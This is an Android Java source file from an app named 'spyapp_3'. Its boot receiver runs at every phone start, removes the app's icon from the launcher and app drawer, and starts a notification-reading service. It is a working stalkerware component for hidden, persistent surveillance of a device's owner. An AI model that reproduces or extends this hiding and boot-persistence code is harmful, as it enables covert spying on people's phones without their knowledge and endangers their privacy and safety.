package com.rubik.spyapp_3.boot;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

import com.rubik.spyapp_3.MainActivity;
import com.rubik.spyapp_3.MyNotificationService;

public class BootReceiver extends BroadcastReceiver {
    public BootReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        hiddenIconInLauncher(context);

        Intent intentService = new Intent(context, MyNotificationService.class);
        intentService.addCategory("android.intent.category.LAUNCHER");
        context.startService(intentService);
        Log.i("Rubik Boot Receiver", "Start Notification Service");
    }

    private void hiddenIconInLauncher(Context context) {
            // remove the icon from App Drawer and launcher
        PackageManager packageManager = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }
}
